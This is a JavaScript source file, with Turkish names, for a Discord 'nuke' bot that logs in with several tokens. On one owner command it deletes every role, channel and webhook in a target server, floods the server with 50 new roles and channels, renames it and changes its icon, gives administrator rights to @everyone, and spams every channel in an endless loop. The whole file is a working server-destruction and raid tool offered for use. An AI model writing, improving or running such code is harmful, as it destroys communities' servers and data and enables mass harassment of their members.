const ayarlar = require('./settings');
const { Botlar } = require('./Client');
for (let sira = 0; sira < ayarlar.token.length; sira++) {
    let token = ayarlar.token[sira]
    const bot = global.bot = new Botlar()

    bot.login(token).catch((hata) => {
        console.log(`[BOT] Giriş yapılamadı. Hata: ${hata}`);
    }).then(() => {
        console.log(`[BOT] ${bot.user.username} ismiyle giriş yaptı.`);
    })

    bot.on("messageCreate", async (mesaj) => {
        if (mesaj.author.bot || !mesaj.guild) return;
        if (!ayarlar.owner.includes(mesaj.author.id)) return;
        if (mesaj.content.toLocaleLowerCase() === `${ayarlar.prefix[0]}vur`) {
            console.log("Vur komutu çalıştırıldı.")
            await RolSil(ayarlar.guildID, sira, ayarlar.token.length)
            await KanalSil(ayarlar.guildID, sira, ayarlar.token.length)
            await RolOlustur(ayarlar.guildID, sira, ayarlar.token.length)
            await KanalOlustur(ayarlar.guildID, sira, ayarlar.token.length)
            await SunucuGuncelle(ayarlar.guildID)
            await HerkeseAdminVer(ayarlar.guildID)
            await Spamla(ayarlar.guildID, sira, ayarlar.token.length)
            await WebhookSil(ayarlar.guildID, sira, ayarlar.token.length)
        }
    })

    async function KanalSil(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        await sunucu.channels.fetch();
        if (ayarlar.Bot.ChannelDelete == false) return;

        const kanallar = Array.from(sunucu.channels.cache.values());
        const atanmisKanallar = kanallar.filter((_, i) => i % toplamToken === tokenSira);

        const silmeSozleri = atanmisKanallar.map(kanal =>
            kanal.delete()
                .then(() => console.log(`[Bot] ${kanal.name} kanalı başarıyla silindi.`))
                .catch(err => console.error(`[HATA] Bot ${kanal.name} kanalını silemedi.`))
        );

        await Promise.all(silmeSozleri);
    }

    async function RolSil(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        await sunucu.roles.fetch();
        if (ayarlar.Bot.RoleDelete == false) return;

        const roller = Array.from(sunucu.roles.cache.values());
        const atanmisRoller = roller.filter((_, i) => i % toplamToken === tokenSira);

        const silmeSozleri = atanmisRoller.map(rol => rol.delete()
            .then(() => console.log(`[Bot] ${rol.name} rolü başarıyla silindi`))
            .catch(err => console.error(`[HATA] Bot ${rol.name} rolünü silemedi.`))
        );

        await Promise.all(silmeSozleri);
    }

    async function RolOlustur(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        if (ayarlar.Bot.RoleCreate == false) return;
        await sunucu.roles.fetch();
        const rolAdet = 50;
        const olusturulacakRoller = Array.from({ length: rolAdet })
            .map((_, i) => i)
            .filter(i => i % toplamToken === tokenSira);

        const olusturmaSozleri = olusturulacakRoller.map(() =>
            sunucu.roles.create({ name: ayarlar.Bot.RoleName, color: "RANDOM" })
                .then(() => console.log(`[Bot] Rol başarıyla oluşturuldu.`))
                .catch(err => console.error(`[HATA] Bot rol oluşturamadı.`))
        );

        await Promise.all(olusturmaSozleri);
    }

    async function KanalOlustur(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        if (ayarlar.Bot.ChannelCreate == false) return;
        await sunucu.channels.fetch();

        const kanalAdet = 50;
        const olusturulacakKanallar = Array.from({ length: kanalAdet })
            .map((_, i) => i)
            .filter(i => i % toplamToken === tokenSira);

        const olusturmaSozleri = olusturulacakKanallar.map(() =>
            sunucu.channels.create(ayarlar.Bot.ChannelName, { type: "text" })
                .then(() => console.log(`[Bot] Kanal başarıyla oluşturuldu.`))
                .catch(err => console.error(`[HATA] Bot kanal oluşturamadı.`))
        );

        await Promise.all(olusturmaSozleri);
    }

    async function SunucuGuncelle(sunucuID) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        if (ayarlar.Bot.GuildUpdate == false) return;

        await sunucu.setName(ayarlar.Bot.GuildName)
            .then(() => console.log(`[Bot] Sunucu adı başarıyla değiştirildi.`))
            .catch(err => console.error(`[HATA] Bot sunucu adını değiştiremedi.`));

        await sunucu.setIcon(ayarlar.Bot.GuildIcon)
            .then(() => console.log(`[Bot] Sunucu ikonu başarıyla değiştirildi.`))
            .catch(err => console.error(`[HATA] Bot sunucu ikonunu değiştiremedi.`));
    }

    async function HerkeseAdminVer(sunucuID) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        if (ayarlar.Bot.EveryoneAdministrator == false) return;
        await sunucu.roles.fetch();

        await sunucu.roles.everyone.setPermissions(["ADMINISTRATOR"])
            .then(() => console.log(`[Bot] @everyone rolüne başarıyla yetki verildi.`))
            .catch(err => console.error(`[HATA] Bot @everyone rolüne yetki veremedi.`));
    }

    async function Spamla(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        if (ayarlar.Bot.Spam == false) return;
        await sunucu.channels.fetch();

        const kanallar = Array.from(sunucu.channels.cache.values());
        const atanmisKanallar = kanallar.filter((_, i) => i % toplamToken === tokenSira);

        while (true) {
            const spamSozleri = atanmisKanallar.map(kanal =>
                kanal.send({ content: ayarlar.Bot.Message })
                    .then(() => console.log(`[Bot] Spam başarıyla gönderildi.`))
                    .catch(() => { })
            );
            await Promise.all(spamSozleri);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }
    }

    async function WebhookSil(sunucuID, tokenSira, toplamToken) {
        let sunucu = bot.guilds.cache.get(sunucuID);
        if (!sunucu) return console.error(`[HATA] Bot sunucuyu bulamadı.`);
        await sunucu.fetchWebhooks();
        if (ayarlar.Bot.WebhookDelete == false) return;

        const webhooklar = Array.from(sunucu?.webhooks?.cache?.values() || []);
        const atanmisWebhooklar = webhooklar.filter((_, i) => i % toplamToken === tokenSira);

        const silmeSozleri = atanmisWebhooklar.map(webhook =>
            webhook?.delete()
                .then(() => console.log(`[Bot] ${webhook.name} webhooku başarıyla silindi.`))
                .catch(err => console.error(`[HATA] Bot ${webhook.name} webhooku silemedi.`))
        );

        await Promise.all(silmeSozleri);
    }
}
